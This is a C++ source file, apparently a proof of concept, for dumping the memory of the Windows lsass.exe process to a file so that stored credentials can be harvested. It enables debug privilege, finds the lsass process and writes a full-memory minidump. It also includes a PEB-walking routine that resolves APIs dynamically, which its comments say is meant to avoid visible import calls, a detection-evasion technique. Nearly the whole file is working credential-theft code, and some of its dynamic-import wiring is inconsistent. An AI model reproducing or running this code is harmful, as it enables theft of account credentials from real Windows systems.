#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#include <winnt.h>
#include <winternl.h>
#include <Lmcons.h>

using namespace std;

#define ADDR unsigned __int64

DWORD ignored;

// Utility function to convert an UNICODE_STRING to a char*
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;
	// If input is null then just return the same.    
	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (NULL == *ppszA)
		return E_OUTOFMEMORY;

	if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL))
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}

namespace dynamic {
	using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
	GetModuleHandlePrototype GetModuleHandle;

	using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
	GetProcAddressPrototype GetProcAddress;

	using Process32FirstPrototype = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32);
	Process32FirstPrototype Process32First;

	using Process32NextPrototype = Process32FirstPrototype;
	Process32NextPrototype Process32Next;

	ADDR find_dll_export(ADDR dll_base, const char* export_name) {
		// Read the DLL PE header and NT header
		PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
		PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);

		// The RVA of the export table if indicated in the PE optional header
		// Read it, and read the export table by adding the RVA to the DLL base address in memory
		DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

		// Browse every export of the DLL. For the i-th export:
		// - The i-th element of the name table contains the export name
		// - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
		DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
		WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
		DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

		for (int i = 0; i < exportTable->NumberOfNames; ++i) {
			char* funcName = (char*)(dll_base + name_table[i]);
			ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
			if (!_strcmpi(funcName, export_name)) {
				return func_ptr;
			}
		}

		return NULL;
	}

	ADDR find_dll_base(const char* dll_name) {
		// https://stackoverflow.com/questions/37288289/how-to-get-the-process-environment-block-peb-address-using-assembler-x64-os - x64 version
		// Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
		//  and GetModuleHandle which defeats the very purpose of this PoC
		PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
		PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

		PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
		PLIST_ENTRY curr = head->Flink;

		// Iterate through every loaded DLL in the current process
		do {
			PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			char* dllName;
			// Convert unicode buffer into char buffer for the time of the comparison, then free it
			UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
			char* result = strstr(dllName, dll_name);
			CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi

			if (result != NULL) {
				// Found the DLL entry in the PEB, return its base address
				return (ADDR)dllEntry->DllBase;
			}
			curr = curr->Flink;
		} while (curr != head);

		return NULL;
	}

	void resolve_imports(void) {
		ADDR kernel32_base = find_dll_base("KERNEL32.DLL");

		#define _import(_name, _type) ((_type) dynamic::GetProcAddress(dynamic::GetModuleHandle("kernel32.dll"), _name))

		dynamic::Process32First = _import("Process32FirstW", Process32FirstPrototype); // "obfuscate string"
		dynamic::Process32Next = _import("Process32NextW", Process32NextPrototype);
	}
}

/* Grant current process DEBUG_PRIVILEGE*/
BOOL EnableTokenPrivilege(LPCTSTR lpszPrivilege) {
	TOKEN_PRIVILEGES tp;
	BOOL bResult = FALSE;
	HANDLE hToken = NULL;
	DWORD dwSize;

	ZeroMemory(&tp, sizeof(tp));
	tp.PrivilegeCount = 1;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken) &&
		LookupPrivilegeValue(NULL, lpszPrivilege, &tp.Privileges[0].Luid)) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, &dwSize);
	}
	CloseHandle(hToken);

	return bResult;
}

/* dump of credentials from lsass */
int main() {
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;
	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (!EnableTokenPrivilege(SE_DEBUG_NAME)) {
		return -1;
	}

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (isDumped) {
		cout << "[+] lsass dumped successfully!" << endl;
	}

	return 0;
}
